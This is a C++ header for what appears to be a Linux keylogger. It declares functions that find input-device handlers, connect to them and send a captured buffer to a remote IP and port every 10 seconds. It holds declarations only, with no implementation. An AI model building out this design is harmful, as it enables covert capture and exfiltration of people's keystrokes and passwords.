#ifndef LOGGER_H_
#define LOGGER_H_

#include <iostream>
#include <fstream>
#include <vector>
#include <regex>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <boost/asio.hpp>
#include <sstream>
#include <thread>
#include <chrono>
#include <atomic>

#define SEND_DATA_INTERVAL 10

namespace logger {

	std::string getDevices();

	std::string getHandler(std::string devices);

	void connectHandler(std::string handler, std::string host, std::string port);

	void sendBufferToRemoteHost(const std::string& buffer, const std::string& ipAddress, const std::string& port);

}

#endif //LOGGER_H_